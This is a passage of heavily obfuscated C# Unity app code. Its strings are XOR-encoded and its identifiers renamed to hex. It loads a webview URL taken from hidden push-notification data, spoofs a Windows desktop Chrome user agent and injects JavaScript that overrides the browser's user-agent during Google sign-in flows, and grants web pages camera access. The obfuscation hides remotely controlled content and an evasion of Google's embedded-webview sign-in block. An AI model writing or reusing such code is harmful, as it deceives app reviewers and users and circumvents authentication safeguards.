            _0x3f7d69bc.Write(_0x0818396b.IV, 0, _0x0818396b.IV.Length);
            using (var _0xa6b9703b = new CryptoStream(_0x3f7d69bc, _0x0818396b.CreateEncryptor(), CryptoStreamMode.Write))
            {
                var _0x2b02ea39 = Encoding.UTF8.GetBytes(_0x5b9afb54);
                _0xa6b9703b.Write(_0x2b02ea39, 0, _0x2b02ea39.Length);
                _0xa6b9703b.FlushFinalBlock();
            }

            return Convert.ToBase64String(_0x3f7d69bc.ToArray());
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private string _0x4225df77 = "";
    private static readonly string WindowsDesktopUserAgent = _0x1ef3e38c._0xdf7d4e91(new byte[111] { 140, 174, 187, 168, 173, 173, 160, 238, 244, 239, 241, 225, 233, 150, 168, 175, 165, 174, 182, 178, 225, 143, 149, 225, 240, 241, 239, 241, 250, 225, 150, 168, 175, 247, 245, 250, 225, 185, 247, 245, 232, 225, 128, 177, 177, 173, 164, 150, 164, 163, 138, 168, 181, 238, 244, 242, 246, 239, 242, 247, 225, 233, 138, 137, 149, 140, 141, 237, 225, 173, 168, 170, 164, 225, 134, 164, 162, 170, 174, 232, 225, 130, 169, 179, 174, 172, 164, 238, 240, 243, 241, 239, 241, 239, 241, 239, 241, 225, 146, 160, 167, 160, 179, 168, 238, 244, 242, 246, 239, 242, 247 }, 193);
    private void WLog(string _0x3115eeb7)
    {
#if B_LOGS
        {
            Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[7] { 51, 60, 13, 27, 28, 53, 72 }, 104) + _0x3115eeb7);
        }
#endif
    }

    private float _0xb1f56d38 = 0f;
    private async Task<bool> _0xe80b3750()
    {
        _0x6203d270.Instance?._0x1f075bc2();
        PushNotificationsService.Instance.OnRemoteNotificationReceived += (_0x3d3c4904) =>
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[32] { 249, 246, 199, 209, 214, 255, 130, 247, 204, 203, 214, 219, 130, 242, 215, 209, 202, 130, 236, 205, 214, 203, 196, 203, 193, 195, 214, 203, 205, 204, 152, 130 }, 162) + string.Join(_0x1ef3e38c._0xdf7d4e91(new byte[1] { 101 }, 108), _0x3d3c4904));
                }
#endif
            }
        };
        try
        {
            _0x517a0997 = await PushNotificationsService.Instance.RegisterForPushNotificationsAsync();
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[31] { 225, 238, 223, 201, 206, 231, 154, 252, 219, 211, 214, 223, 222, 154, 206, 213, 154, 221, 223, 206, 154, 202, 207, 201, 210, 154, 206, 213, 209, 223, 212 }, 186));
                }
#endif
            }

            _0x517a0997 = "";
        }

        _0x811d32fd = !string.IsNullOrEmpty(_0x517a0997);
        _0x1d937298 = _0x3ca11756();
        {
#if B_LOGS
            Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[25] { 106, 101, 84, 66, 69, 108, 17, 100, 95, 88, 69, 72, 17, 97, 68, 66, 89, 17, 101, 94, 90, 84, 95, 11, 17 }, 49) + _0x517a0997);
#endif
        }

        _0x6203d270.Instance?._0x576e5b21();
        return false;
    }

    internal Button _0x664c162c(string _0x3879ba2a, Transform _0x1acd89b9)
    {
        var _0xe3c6bf0c = new GameObject(_0x3879ba2a + _0x1ef3e38c._0xdf7d4e91(new byte[3] { 16, 38, 60 }, 82), typeof(RectTransform), typeof(Image), typeof(Button));
        var _0xa04b77b8 = _0xe3c6bf0c.GetComponent<RectTransform>();
        _0xa04b77b8.SetParent(_0x1acd89b9, false);
        var _0x2613f8b9 = _0xe3c6bf0c.GetComponent<Image>();
        _0x2613f8b9.color = new Color(0.92f, 0.92f, 0.95f, 1f);
        var _0xd6b330c6 = _0xe3c6bf0c.GetComponent<Button>();
        var _0x549735be = _0xd6b330c6.colors;
        _0x549735be.highlightedColor = new Color(0.85f, 0.85f, 0.9f);
        _0x549735be.pressedColor = new Color(0.8f, 0.8f, 0.88f);
        _0xd6b330c6.colors = _0x549735be;
        var _0x259501c3 = new GameObject(_0x1ef3e38c._0xdf7d4e91(new byte[4] { 38, 23, 10, 6 }, 114), typeof(RectTransform), typeof(Text));
        var _0x8e6b213d = _0x259501c3.GetComponent<RectTransform>();
        _0x8e6b213d.SetParent(_0xe3c6bf0c.transform, false);
        _0x8e6b213d.anchorMin = Vector2.zero;
        _0x8e6b213d.anchorMax = Vector2.one;
        _0x8e6b213d.offsetMin = _0x8e6b213d.offsetMax = Vector2.zero;
        var _0x2e2fd633 = _0x259501c3.GetComponent<Text>();
        _0x2e2fd633.text = _0x3879ba2a;
        _0x2e2fd633.alignment = TextAnchor.MiddleCenter;
        _0x2e2fd633.color = Color.black;
        _0x2e2fd633.font = Resources.GetBuiltinResource<Font>(_0x1ef3e38c._0xdf7d4e91(new byte[9] { 28, 47, 52, 60, 49, 115, 41, 41, 59 }, 93));
        _0x2e2fd633.fontSize = 28;
        WLog(_0x1ef3e38c._0xdf7d4e91(new byte[14] { 65, 112, 103, 99, 118, 103, 64, 119, 118, 118, 109, 108, 34, 37 }, 2) + _0x3879ba2a + _0x1ef3e38c._0xdf7d4e91(new byte[1] { 103 }, 64));
        return _0xd6b330c6;
    }

    public void _0x0ec45f13()
    {
        isDestroyedForce = true;
        StopAllCoroutines();
        {
#if B_LOGS
            Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[18] { 170, 165, 148, 130, 133, 172, 209, 189, 144, 132, 159, 146, 153, 209, 182, 144, 156, 148 }, 241));
#endif
        }

        _0x6203d270.Instance?._0x2b7f69e1();
        _0xc5708f85.Instance._0x2f1d0f37(_0xddcc2409._0xe09069ce.DEFAULT);
    }

    private IEnumerator _0xd9093ada(Dictionary<string, object> _0x6341da1d)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[30] { 76, 67, 114, 100, 99, 74, 55, 81, 114, 99, 116, 127, 55, 82, 111, 99, 101, 118, 55, 71, 98, 100, 127, 55, 83, 118, 99, 118, 45, 55 }, 23) + string.Join(_0x1ef3e38c._0xdf7d4e91(new byte[1] { 251 }, 242), _0x6341da1d));
#endif
            }
        }

        string _0x8e2387e5 = "";
        // Primary source: nested JSON under "notificationData"
        if (_0x6341da1d != null && _0x6341da1d.TryGetValue(_0x1ef3e38c._0xdf7d4e91(new byte[16] { 151, 150, 141, 144, 159, 144, 154, 152, 141, 144, 150, 151, 189, 152, 141, 152 }, 249), out var raw))
        {
            try
            {
                var _0xd3e2a79a = raw?.ToString();
                var _0x4ab31946 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xd3e2a79a);
                if (_0x4ab31946 != null && _0x4ab31946.TryGetValue(_0x1ef3e38c._0xdf7d4e91(new byte[6] { 42, 60, 55, 61, 48, 61 }, 89), out var val))
                {
                    _0x8e2387e5 = val?.ToString();
                }
            }
            catch (Exception e)
            {
#if B_LOGS
                Debug.LogError(_0x1ef3e38c._0xdf7d4e91(new byte[30] { 133, 138, 187, 173, 170, 254, 142, 171, 173, 182, 131, 254, 148, 141, 145, 144, 254, 174, 191, 172, 173, 187, 254, 187, 172, 172, 177, 172, 228, 254 }, 222) + e);
#endif
            }
        }

        // Fallback: flat structure
        if (string.IsNullOrEmpty(_0x8e2387e5) && _0x6341da1d != null && _0x6341da1d.TryGetValue(_0x1ef3e38c._0xdf7d4e91(new byte[6] { 216, 206, 197, 207, 194, 207 }, 171), out var lab))
        {
            _0x8e2387e5 = lab?.ToString();
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[38] { 218, 213, 228, 242, 245, 161, 209, 244, 242, 233, 220, 161, 199, 228, 245, 226, 233, 228, 229, 161, 242, 228, 239, 229, 232, 229, 161, 231, 243, 238, 236, 161, 235, 242, 238, 239, 187, 161 }, 129) + _0x8e2387e5);
            }
#endif
        }

        if (string.IsNullOrEmpty(_0x8e2387e5))
            yield break;
        {
#if B_LOGS
            {
                Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[38] { 146, 157, 172, 186, 189, 233, 153, 188, 186, 161, 148, 233, 158, 168, 160, 189, 233, 189, 166, 233, 166, 185, 172, 167, 233, 190, 160, 189, 161, 233, 186, 172, 167, 173, 160, 173, 243, 233 }, 201) + _0x8e2387e5);
            }
#endif
        }

        _0x2291ee43 = _0x8e2387e5;
        yield return new WaitUntil(() => _0x48f9d797);
        var _0x257bfbaf = _0xd41dca0b(2, 100);
        yield return new WaitUntil(() => _0x257bfbaf.IsCompleted);
        string _0x03c2a9f1 = _0x257bfbaf.Result;
        if (!string.IsNullOrEmpty(_0x03c2a9f1))
        {
            string _0x654a65a8 = _0x793fc76b(_0x03c2a9f1, _0x8e2387e5);
            {
#if B_LOGS
                Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[33] { 44, 35, 18, 4, 3, 87, 39, 2, 4, 31, 42, 87, 37, 18, 27, 24, 22, 19, 87, 32, 18, 21, 33, 30, 18, 0, 87, 0, 30, 3, 31, 77, 87 }, 119) + _0x654a65a8);
#endif
            }

            _0xacca79f6.Load(_0x654a65a8);
        }
    }

    private void _0x73da0beb(UniWebView _0xdd1cb19e)
    {
        if (_0x8c5e6ae3)
            return;
        _0x8c5e6ae3 = true;
        _0xdd1cb19e.AddUrlScheme(_0x1ef3e38c._0xdf7d4e91(new byte[2] { 177, 162 }, 197));
        _0xdd1cb19e.AddUrlScheme(_0x1ef3e38c._0xdf7d4e91(new byte[6] { 15, 8, 18, 3, 8, 18 }, 102));
        _0xdd1cb19e.AddUrlScheme(_0x1ef3e38c._0xdf7d4e91(new byte[6] { 245, 249, 234, 243, 253, 236 }, 152));
        _0xdd1cb19e.OnMessageReceived += (_0xba0bafbd, _0xfdbb5c35) =>
        {
            if (TryOpenExternalLikeChrome(_0xfdbb5c35.RawMessage))
            {
                _0x4a9b2c8e(false);
                return;
            }
        };
        _0xdd1cb19e.RegisterShouldHandleRequest(_0x7bbb21c2 =>
        {
            string _0x5b4f8c7b = _0x7bbb21c2 != null ? _0x7bbb21c2.Url : string.Empty;
            if (string.IsNullOrEmpty(_0x5b4f8c7b))
                return true;
            WLog(_0x1ef3e38c._0xdf7d4e91(new byte[21] { 61, 6, 1, 27, 2, 10, 38, 15, 0, 10, 2, 11, 60, 11, 31, 27, 11, 29, 26, 84, 78 }, 110) + _0x5b4f8c7b);
            if (TryOpenExternalLikeChrome(_0x5b4f8c7b))
            {
                _0x4a9b2c8e(false);
                return false;
            }

            if (_0x7bbb21c2 != null && _0x7bbb21c2.IsMainFrame && IsGoogleAuthFlowUrl(_0x5b4f8c7b) && !_0x097dfff6)
            {
                WLog(_0x1ef3e38c._0xdf7d4e91(new byte[62] { 188, 144, 152, 159, 209, 166, 148, 147, 167, 152, 148, 134, 209, 149, 148, 133, 148, 146, 133, 148, 149, 209, 182, 158, 158, 150, 157, 148, 209, 144, 132, 133, 153, 209, 164, 163, 189, 209, 220, 207, 209, 131, 148, 157, 158, 144, 149, 209, 134, 152, 133, 153, 209, 182, 158, 158, 150, 157, 148, 209, 164, 176 }, 241));
                _0x097dfff6 = true;
                _0x4a9b2c8e(true);
                _0xacca79f6.SetUserAgent(_0x2eeeb950());
                _0xacca79f6.Load(_0x5b4f8c7b);
                return false;
            }

            return true;
        });
        _0xdd1cb19e.OnLoadingErrorReceived += (_0xba0bafbd, _0x5e2cc322, _0xfdbb5c35, _0x195b9cfc) =>
        {
            WLog(_0x1ef3e38c._0xdf7d4e91(new byte[25] { 244, 216, 208, 215, 153, 238, 220, 219, 239, 208, 220, 206, 153, 252, 203, 203, 214, 203, 131, 153, 218, 214, 221, 220, 132 }, 185) + _0x5e2cc322 + _0x1ef3e38c._0xdf7d4e91(new byte[9] { 216, 149, 157, 139, 139, 153, 159, 157, 197 }, 248) + _0xfdbb5c35);
            string _0x45d9f853 = GetFailingUrl(_0x195b9cfc);
            if (string.IsNullOrEmpty(_0x45d9f853) || IsAboutBlank(_0x45d9f853))
                return;
            _ = _0xd08c2883(_0x1ef3e38c._0xdf7d4e91(new byte[8] { 14, 15, 38, 28, 11, 11, 22, 11 }, 121));
            WLog(_0x1ef3e38c._0xdf7d4e91(new byte[45] { 120, 84, 92, 91, 21, 98, 80, 87, 99, 92, 80, 66, 21, 83, 84, 92, 89, 92, 91, 82, 21, 96, 103, 121, 21, 24, 11, 21, 90, 69, 80, 91, 21, 80, 77, 65, 80, 71, 91, 84, 89, 89, 76, 15, 21 }, 53) + _0x45d9f853);
            StopCurrentFailedLoad(_0xba0bafbd);
            _0x9098082f(_0x45d9f853);
        };
        _0xdd1cb19e.OnPageStarted += (_0xba0bafbd, _0x87f8560c) =>
        {
            _0x37aa1f19 = 0;
            if (_0x1f470ba2 && IsAboutBlank(_0x87f8560c))
            {
                WLog(_0x1ef3e38c._0xdf7d4e91(new byte[27] { 247, 213, 194, 208, 198, 213, 202, 135, 198, 197, 200, 210, 211, 157, 197, 203, 198, 201, 204, 135, 212, 211, 198, 213, 211, 194, 195 }, 167));
                return;
            }

            WLog(_0x1ef3e38c._0xdf7d4e91(new byte[29] { 66, 110, 102, 97, 47, 88, 106, 109, 89, 102, 106, 120, 47, 64, 97, 95, 110, 104, 106, 92, 123, 110, 125, 123, 106, 107, 53, 47, 36 }, 15) + (Time.realtimeSinceStartup - _0xb1f56d38).ToString(_0x1ef3e38c._0xdf7d4e91(new byte[5] { 172, 178, 172, 172, 172 }, 156)) + _0x1ef3e38c._0xdf7d4e91(new byte[2] { 243, 160 }, 128) + _0x87f8560c);
            if (TryOpenExternalLikeChrome(_0x87f8560c))
            {
                StopCurrentFailedLoad(_0xba0bafbd);
                return;
            }

            if (ContainsIgnoreCase(_0x87f8560c, _0x1ef3e38c._0xdf7d4e91(new byte[8] { 187, 182, 182, 190, 241, 190, 175, 175 }, 223)) || ContainsIgnoreCase(_0x87f8560c, _0x1ef3e38c._0xdf7d4e91(new byte[15] { 13, 28, 4, 83, 10, 20, 25, 26, 24, 9, 83, 31, 17, 18, 26 }, 125)) || _0x87f8560c.StartsWith(_0x1ef3e38c._0xdf7d4e91(new byte[25] { 50, 46, 46, 42, 41, 96, 117, 117, 56, 42, 61, 54, 53, 56, 59, 54, 60, 59, 44, 116, 54, 51, 44, 63, 117 }, 90), StringComparison.OrdinalIgnoreCase))
            {
                StopCurrentFailedLoad(_0xba0bafbd);
                OpenUrlExternally(_0x87f8560c);
                return;
            }

            if (IsGoogleAuthFlowUrl(_0x87f8560c))
            {
                _0x4a9b2c8e(true);
                WLog(_0x1ef3e38c._0xdf7d4e91(new byte[41] { 221, 245, 245, 253, 246, 255, 186, 251, 239, 238, 242, 186, 252, 246, 245, 237, 186, 254, 255, 238, 255, 249, 238, 255, 254, 186, 183, 164, 186, 241, 255, 255, 234, 186, 236, 243, 233, 243, 248, 246, 255 }, 154));
                return;
            }

            _0x40fcc2ea = true;
            _0x4a9b2c8e(true);
            WLog(_0x1ef3e38c._0xdf7d4e91(new byte[43] { 229, 215, 208, 228, 219, 215, 197, 146, 222, 221, 211, 214, 219, 220, 213, 157, 192, 215, 214, 219, 192, 215, 209, 198, 219, 220, 213, 146, 159, 140, 146, 217, 215, 215, 194, 146, 196, 219, 193, 219, 208, 222, 215 }, 178));
        };
        _0xdd1cb19e.OnPageCommitted += (_0xba0bafbd, _0x87f8560c) =>
        {
            if (_0x1f470ba2 && IsAboutBlank(_0x87f8560c))
                return;
            WLog(_0x1ef3e38c._0xdf7d4e91(new byte[31] { 217, 245, 253, 250, 180, 195, 241, 246, 194, 253, 241, 227, 180, 219, 250, 196, 245, 243, 241, 215, 251, 249, 249, 253, 224, 224, 241, 240, 174, 180, 191 }, 148) + (Time.realtimeSinceStartup - _0xb1f56d38).ToString(_0x1ef3e38c._0xdf7d4e91(new byte[5] { 248, 230, 248, 248, 248 }, 200)) + _0x1ef3e38c._0xdf7d4e91(new byte[2] { 148, 199 }, 231) + _0x87f8560c);
            if (!firstLoadShown && IsHttpUrl(_0x87f8560c))
            {
                firstLoadShown = true;
                _0x40fcc2ea = false;
                _0x4a9b2c8e(false);
                _0x751181a2();
                _0xe461db45();
                _0xba0bafbd.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0xd08c2883(_0x1ef3e38c._0xdf7d4e91(new byte[9] { 232, 233, 192, 240, 239, 250, 241, 250, 251 }, 159));
                WLog(_0x1ef3e38c._0xdf7d4e91(new byte[39] { 90, 118, 126, 121, 55, 64, 114, 117, 65, 126, 114, 96, 55, 100, 127, 120, 96, 121, 55, 120, 121, 55, 116, 120, 122, 122, 126, 99, 99, 114, 115, 55, 116, 120, 121, 99, 114, 121, 99 }, 23));
            }
        };
        _0xdd1cb19e.OnPageProgressChanged += (_0xba0bafbd, _0x1af2412d) =>
        {
            if (_0x1f470ba2)
                return;
            if (!firstLoadShown && _0x1af2412d >= 0.65f)
            {
                firstLoadShown = true;
                _0x40fcc2ea = false;
                _0x4a9b2c8e(false);
                _0x751181a2();
                _0xe461db45();
                _0xba0bafbd.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0xd08c2883(_0x1ef3e38c._0xdf7d4e91(new byte[9] { 83, 82, 123, 75, 84, 65, 74, 65, 64 }, 36));
                WLog(_0x1ef3e38c._0xdf7d4e91(new byte[32] { 48, 28, 20, 19, 93, 42, 24, 31, 43, 20, 24, 10, 93, 14, 21, 18, 10, 19, 93, 31, 4, 93, 13, 15, 18, 26, 15, 24, 14, 14, 71, 93 }, 125) + _0x1af2412d);
            }
        };
        _0xdd1cb19e.OnPageFinished += (_0xba0bafbd, _0x5e2cc322, _0x87f8560c) =>
        {
            if (_0x1f470ba2 && IsAboutBlank(_0x87f8560c))
            {
                _0x1f470ba2 = false;
                WLog(_0x1ef3e38c._0xdf7d4e91(new byte[28] { 163, 129, 150, 132, 146, 129, 158, 211, 146, 145, 156, 134, 135, 201, 145, 159, 146, 157, 152, 211, 149, 154, 157, 154, 128, 155, 150, 151 }, 243));
                return;
            }

            WLog(_0x1ef3e38c._0xdf7d4e91(new byte[24] { 37, 9, 1, 6, 72, 63, 13, 10, 62, 1, 13, 31, 72, 46, 1, 6, 1, 27, 0, 13, 12, 82, 72, 67 }, 104) + (Time.realtimeSinceStartup - _0xb1f56d38).ToString(_0x1ef3e38c._0xdf7d4e91(new byte[5] { 233, 247, 233, 233, 233 }, 217)) + _0x1ef3e38c._0xdf7d4e91(new byte[7] { 189, 238, 173, 161, 170, 171, 243 }, 206) + _0x5e2cc322 + _0x1ef3e38c._0xdf7d4e91(new byte[5] { 25, 76, 75, 85, 4 }, 57) + _0x87f8560c);
            if (!firstLoadShown)
            {
                firstLoadShown = true;
                _0x40fcc2ea = false;
                _0x4a9b2c8e(false);
                _0x751181a2();
                _0xe461db45();
                _0xba0bafbd.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0xd08c2883(_0x1ef3e38c._0xdf7d4e91(new byte[9] { 33, 32, 9, 57, 38, 51, 56, 51, 50 }, 86));
                WLog(_0x1ef3e38c._0xdf7d4e91(new byte[33] { 54, 26, 18, 21, 91, 44, 30, 25, 45, 18, 30, 12, 91, 29, 18, 9, 8, 15, 91, 23, 20, 26, 31, 91, 24, 20, 22, 11, 23, 30, 15, 30, 31 }, 123));
            }
            else if (_0x40fcc2ea)
            {
                _0x40fcc2ea = false;
                _0x4a9b2c8e(false);
                _0xba0bafbd.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                WLog(_0x1ef3e38c._0xdf7d4e91(new byte[40] { 36, 8, 0, 7, 73, 62, 12, 11, 63, 0, 12, 30, 73, 58, 1, 6, 30, 73, 8, 15, 29, 12, 27, 73, 5, 6, 8, 13, 0, 7, 14, 73, 15, 0, 7, 0, 26, 1, 12, 13 }, 105));
            }
            else
            {
                _0x4a9b2c8e(false);
            }

            if (_0x097dfff6 && !IsGoogleAuthFlowUrl(_0x87f8560c) && !IsGoogleAuthFlowUrl(_0x87f8560c))
            {
                WLog(_0x1ef3e38c._0xdf7d4e91(new byte[48] { 77, 101, 101, 109, 102, 111, 42, 107, 127, 126, 98, 42, 121, 111, 111, 103, 121, 42, 108, 99, 100, 99, 121, 98, 111, 110, 42, 39, 52, 42, 120, 111, 121, 126, 101, 120, 111, 42, 110, 111, 108, 107, 127, 102, 126, 42, 95, 75 }, 10));
                _0x097dfff6 = false;
                _0xacca79f6.SetUserAgent("");
            }
        };
        _0xdd1cb19e.OnShouldClose += _0xba0bafbd =>
        {
            WLog(_0x1ef3e38c._0xdf7d4e91(new byte[41] { 161, 174, 159, 137, 142, 167, 218, 183, 155, 147, 148, 218, 173, 159, 152, 172, 147, 159, 141, 218, 181, 148, 169, 146, 149, 143, 150, 158, 185, 150, 149, 137, 159, 218, 147, 148, 140, 149, 145, 159, 158 }, 250));
            _0x5bd83259();
            return false;
        };
        // POPUP HANDLING LOGIC
        _0xdd1cb19e.SetPopupPageEventEnabled(true);
        bool _0x32326a32 = false;
        bool _0x614c7757 = false;
        _0xdd1cb19e.OnMultipleWindowOpened += (_0xba0bafbd, _0x28dde375) =>
        {
            _0xba0bafbd.ScrollTo(0, 0, false);
            WLog(_0x1ef3e38c._0xdf7d4e91(new byte[43] { 88, 87, 102, 112, 119, 94, 35, 78, 98, 106, 109, 35, 84, 102, 97, 85, 106, 102, 116, 35, 78, 118, 111, 119, 106, 115, 111, 102, 84, 106, 109, 103, 108, 116, 35, 76, 115, 102, 109, 102, 103, 57, 35 }, 3) + _0x28dde375);
            var _0x3249672e = _0xdd1cb19e.GetPopupWindow(_0x28dde375);
            if (_0x3249672e == null)
                return;
            _0x776a3ae9.Add(_0x3249672e);
            Debug.Log($"[Test] Popup ID: {_0x3249672e.Id}");
            _0x3249672e.OnPageStarted += (_0xc907dc78, _0x87f8560c) =>
            {
                WLog(_0x1ef3e38c._0xdf7d4e91(new byte[36] { 80, 95, 110, 120, 127, 86, 43, 91, 100, 123, 126, 123, 43, 92, 110, 105, 93, 98, 110, 124, 43, 68, 101, 91, 106, 108, 110, 88, 127, 106, 121, 127, 110, 111, 49, 43 }, 11) + _0x87f8560c);
                _0x37aa1f19 = 0;
                if (string.IsNullOrEmpty(_0x87f8560c) || IsAboutBlank(_0x87f8560c))
                    return;
                if (IsGoogleAuthFlowUrl(_0x87f8560c))
                {
                    WLog(_0x1ef3e38c._0xdf7d4e91(new byte[57] { 166, 169, 152, 142, 137, 160, 221, 173, 146, 141, 136, 141, 221, 186, 146, 146, 154, 145, 152, 221, 156, 136, 137, 149, 221, 155, 145, 146, 138, 221, 208, 195, 221, 142, 141, 146, 146, 155, 221, 186, 146, 146, 154, 145, 152, 221, 190, 149, 143, 146, 144, 152, 221, 168, 188, 199, 221 }, 253) + _0x87f8560c);
                    _0x32326a32 = false;
                    _0xcb343b13();
                    if (_0xc907dc78 != null && _0xc907dc78.IsAlive)
                        _0xc907dc78.EvaluateJavaScript(_0xeab44504());
                    return;
                }

                if (_0xacca79f6 == null)
                    return;
                if (!_0x32326a32)
                {
                    _0x32326a32 = true;
                    _0xacca79f6.SetUserAgent(WindowsDesktopUserAgent);
                    WLog(_0x1ef3e38c._0xdf7d4e91(new byte[39] { 147, 156, 173, 187, 188, 149, 232, 152, 167, 184, 189, 184, 232, 169, 184, 184, 164, 177, 232, 159, 161, 166, 172, 167, 191, 187, 232, 172, 173, 187, 163, 188, 167, 184, 232, 157, 137, 242, 232 }, 200) + _0x87f8560c);
                }

                if (_0xc907dc78 != null && _0xc907dc78.IsAlive)
                    _0xc907dc78.EvaluateJavaScript(_0x2503e242());
                if (!_0x614c7757 && _0xc907dc78 != null && _0xc907dc78.IsAlive && IsHttpUrl(_0x87f8560c))
                {
                    _0x614c7757 = true;
                }
            };
            _0x3249672e.OnPageFinished += (_0xc907dc78, _0x195b9cfc) =>
            {
                string _0xd7cecdf4 = _0x195b9cfc != null ? _0x195b9cfc.data : string.Empty;
                WLog(_0x1ef3e38c._0xdf7d4e91(new byte[35] { 45, 34, 19, 5, 2, 43, 86, 38, 25, 6, 3, 6, 86, 33, 19, 20, 32, 31, 19, 1, 86, 48, 31, 24, 31, 5, 30, 19, 18, 76, 86, 3, 4, 26, 75 }, 118) + _0xd7cecdf4);
                if (_0xc907dc78 == null || !_0xc907dc78.IsAlive)
                    return;
                if (IsGoogleAuthFlowUrl(_0xd7cecdf4))
                {
                    _0xcb343b13();
                    _0xc907dc78.EvaluateJavaScript(_0xeab44504());
                    return;
                }

                if (!_0x32326a32)
                    return;
                _0xc907dc78.EvaluateJavaScript(_0x2503e242());
            };
        };
        _0xdd1cb19e.OnMultipleWindowClosed += (_0xba0bafbd, _0x28dde375) =>
        {
            _0x776a3ae9.RemoveAll(_0x3543f83e => _0x3543f83e == null || _0x3543f83e.Id == _0x28dde375 || !_0x3543f83e.IsAlive);
            _0x4a9b2c8e(false);
            if (_0x776a3ae9.Count == 0 && _0xacca79f6 != null)
            {
                _0x32326a32 = false;
                _0x614c7757 = false;
                _0x7c78a887();
            }

            WLog(_0x1ef3e38c._0xdf7d4e91(new byte[43] { 3, 12, 61, 43, 44, 5, 120, 21, 57, 49, 54, 120, 15, 61, 58, 14, 49, 61, 47, 120, 21, 45, 52, 44, 49, 40, 52, 61, 15, 49, 54, 60, 55, 47, 120, 27, 52, 55, 43, 61, 60, 98, 120 }, 88) + _0x28dde375);
        };
        _0xdd1cb19e.RegisterOnRequestMediaCapturePermission(_0x7bbb21c2 =>
        {
            if (!Permission.HasUserAuthorizedPermission(Permission.Camera))
            {
                Permission.RequestUserPermission(Permission.Camera);
                return UniWebViewMediaCapturePermissionDecision.Prompt;
            }

            return UniWebViewMediaCapturePermissionDecision.Grant;
        });
    }

    private string _0xf01833cd()
    {
        try
        {
            using (var _0x3c4fb929 = new AndroidJavaClass(_0x1ef3e38c._0xdf7d4e91(new byte[30] { 155, 151, 149, 214, 141, 150, 145, 140, 129, 203, 156, 214, 136, 148, 153, 129, 157, 138, 214, 173, 150, 145, 140, 129, 168, 148, 153, 129, 157, 138 }, 248)))
            {
                var _0x6d0b5487 = _0x3c4fb929.GetStatic<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[15] { 75, 93, 90, 90, 77, 70, 92, 105, 75, 92, 65, 94, 65, 92, 81 }, 40));
                var _0x14211660 = _0x6d0b5487.Call<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[21] { 61, 63, 46, 27, 42, 42, 54, 51, 57, 59, 46, 51, 53, 52, 25, 53, 52, 46, 63, 34, 46 }, 90));
                using (var _0xce18cbcb = new AndroidJavaClass(_0x1ef3e38c._0xdf7d4e91(new byte[26] { 80, 95, 85, 67, 94, 88, 85, 31, 70, 84, 83, 90, 88, 69, 31, 102, 84, 83, 98, 84, 69, 69, 88, 95, 86, 66 }, 49)))
                {
                    return _0xce18cbcb.CallStatic<string>(_0x1ef3e38c._0xdf7d4e91(new byte[19] { 49, 51, 34, 18, 51, 48, 55, 35, 58, 34, 3, 37, 51, 36, 23, 49, 51, 56, 34 }, 86), _0x14211660);
                }
            }
        }
        catch
        {
            return "";
        }
    }

    private string _0xeab44504()
    {
        string _0xa22a9cd5 = _0x2eeeb950();
        if (string.IsNullOrEmpty(_0xa22a9cd5))
            return _0x1ef3e38c._0xdf7d4e91(new byte[7] { 227, 250, 252, 241, 181, 165, 174 }, 149);
        string _0x33c46c67 = _0xa22a9cd5.Replace(_0x1ef3e38c._0xdf7d4e91(new byte[1] { 79 }, 19), _0x1ef3e38c._0xdf7d4e91(new byte[2] { 32, 32 }, 124)).Replace(_0x1ef3e38c._0xdf7d4e91(new byte[1] { 217 }, 254), _0x1ef3e38c._0xdf7d4e91(new byte[2] { 24, 99 }, 68));
        var _0xe2394612 = Regex.Match(_0xa22a9cd5, _0x1ef3e38c._0xdf7d4e91(new byte[12] { 180, 159, 133, 152, 154, 146, 216, 223, 171, 147, 220, 222 }, 247));
        string _0x38c83fd8 = _0xe2394612.Success ? _0xe2394612.Groups[1].Value : _0x1ef3e38c._0xdf7d4e91(new byte[3] { 218, 217, 219 }, 235);
        return _0x1ef3e38c._0xdf7d4e91(new byte[12] { 42, 100, 119, 108, 97, 118, 107, 109, 108, 42, 43, 121 }, 2) + _0x1ef3e38c._0xdf7d4e91(new byte[8] { 248, 239, 252, 174, 251, 239, 179, 169 }, 142) + _0x33c46c67 + _0x1ef3e38c._0xdf7d4e91(new byte[2] { 1, 29 }, 38) + _0x1ef3e38c._0xdf7d4e91(new byte[30] { 57, 46, 61, 111, 63, 61, 32, 59, 32, 114, 1, 46, 57, 38, 40, 46, 59, 32, 61, 97, 63, 61, 32, 59, 32, 59, 54, 63, 42, 116 }, 79) + _0x1ef3e38c._0xdf7d4e91(new byte[121] { 19, 0, 27, 22, 1, 28, 26, 27, 85, 17, 16, 19, 93, 26, 23, 31, 89, 30, 16, 12, 89, 3, 20, 25, 92, 14, 1, 7, 12, 14, 58, 23, 31, 16, 22, 1, 91, 17, 16, 19, 28, 27, 16, 37, 7, 26, 5, 16, 7, 1, 12, 93, 26, 23, 31, 89, 30, 16, 12, 89, 14, 18, 16, 1, 79, 19, 0, 27, 22, 1, 28, 26, 27, 93, 92, 14, 7, 16, 1, 0, 7, 27, 85, 3, 20, 25, 78, 8, 89, 22, 26, 27, 19, 28, 18, 0, 7, 20, 23, 25, 16, 79, 1, 7, 0, 16, 8, 92, 78, 8, 22, 20, 1, 22, 29, 93, 16, 92, 14, 8, 8 }, 117) + _0x1ef3e38c._0xdf7d4e91(new byte[26] { 139, 138, 137, 199, 159, 157, 128, 155, 128, 195, 200, 154, 156, 138, 157, 174, 136, 138, 129, 155, 200, 195, 154, 142, 198, 212 }, 239) + 